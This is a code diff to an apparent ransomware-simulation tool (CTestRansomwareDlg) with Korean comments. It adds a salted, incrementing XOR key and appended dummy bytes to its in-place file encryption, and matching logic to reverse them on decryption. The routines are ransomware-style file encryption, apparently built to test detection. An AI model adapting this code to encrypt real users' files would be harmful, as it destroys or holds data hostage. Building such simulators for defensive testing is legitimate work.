@@ -11,8 +11,6 @@
 #define new DEBUG_NEW
 #endif
 
-#define FILE_BUF_SIZE 4096
-
 HWND hWnd;
 CTestRansomwareDlg *g_pParent;
 
@@ -114,7 +112,11 @@ BOOL CTestRansomwareDlg::OnInitDialog()
 	m_cryptOffset = 0;
 	m_cryptType = 0;
 	m_cryptInterval = 0;
+	m_nDummyByte = 0;
 	m_bBypassDecoy = false;
+	m_bSaltXOR = false;
+
+	m_nSaltXOR = 0;
 
 
 	// CRITICAL SECTION - Initial
@@ -647,18 +649,29 @@ bool CTestRansomwareDlg::EncryptFileRs(CString strPath)
 	if(m_cryptType > 1)
 		dest = fopen((LPSTR)(LPCTSTR)strPath2, "wb");
 
+	m_nSaltXOR = 0;
+
 	while (size = fread(buf, 1, FILE_BUF_SIZE, source)) {
 		cur = ftell(source) + (-1)*size;
 		for (int i = 0; i < size; i++){
 			if (cur + i < m_cryptOffset) continue;
-			buf[i] = buf[i] ^ (unsigned char)m_cryptKey; // XOR
+			buf[i] = buf[i] ^ (unsigned char)(m_nSaltXOR + m_cryptKey); // XOR
+			if (m_bSaltXOR) m_nSaltXOR++;
 		}
 		if (m_cryptType == 0 || m_cryptType == 1) {
 			bEof = feof(source);
 			fseek(source, (-1)*size, SEEK_CUR);
 			fwrite(buf, 1, size, source);
-			if (bEof != 0)
+			if (bEof != 0) {
+				// Dummy byte
+				if(m_nDummyByte > 0){
+					if (m_nDummyByte > FILE_BUF_SIZE)
+						m_nDummyByte = FILE_BUF_SIZE;
+					memset(buf, 0, m_nDummyByte);
+					fwrite(buf, 1, m_nDummyByte, source);
+				}
 				break; // EOF
+			}
 		}else{
 			fwrite(buf, 1, size, dest);
 		}
@@ -692,6 +705,7 @@ bool CTestRansomwareDlg::DecryptFileRs()
 {
 	FILE* fpList;
 	FILE* source;
+	size_t file_size;
 	size_t size;
 	int cur;
 	int bEof;
@@ -714,11 +728,19 @@ bool CTestRansomwareDlg::DecryptFileRs()
 		source = fopen(szFilePath, "rb+");
 		if (source == NULL)
 			continue;
+
+		m_nSaltXOR = 0;
+
+		fseek(source, 0, SEEK_END);
+		file_size = ftell(source);
+		fseek(source, 0, SEEK_SET);
+
 		while (size = fread(buf, 1, FILE_BUF_SIZE, source)) {
 			cur = ftell(source) + (-1)*size;
 			for (int i = 0; i < size; i++){
 				if (cur + i < m_cryptOffset) continue;
-				buf[i] = buf[i] ^ (unsigned char)m_cryptKey; // XOR
+				buf[i] = buf[i] ^ (unsigned char)(m_nSaltXOR + m_cryptKey); // XOR
+				if (m_bSaltXOR) m_nSaltXOR++;
 			}
 			bEof = feof(source);
 			fseek(source, (-1)*size, SEEK_CUR);
@@ -727,12 +749,23 @@ bool CTestRansomwareDlg::DecryptFileRs()
 				break; // EOF
 		}
 		fclose(source);
+
+		// Dummy byte - Delete
+		HANDLE hFile = CreateFile(szFilePath, GENERIC_WRITE, FILE_SHARE_WRITE, NULL, CREATE_NEW | OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+		LARGE_INTEGER ilDistanceToMove;
+		ilDistanceToMove.QuadPart = GetFileSize(hFile, NULL) - m_nDummyByte;
+		SetFilePointerEx(hFile, ilDistanceToMove, NULL, FILE_BEGIN);
+		SetEndOfFile(hFile);
+		CloseHandle(hFile);
+
+		// rename
 		if (m_cryptType > 0) {
 			strPath2 = szFilePath;
 			strPath2.Replace(".enc", "");
 			DeleteFile(strPath2); // 원본 파일 삭제
 			MoveFileEx(szFilePath, strPath2, MOVEFILE_COPY_ALLOWED); // 파일 이름 변경
 		}
+
 		strTemp.Format("복구 완료: %s", szFilePath);
 		AddLogList(strTemp);
 	}
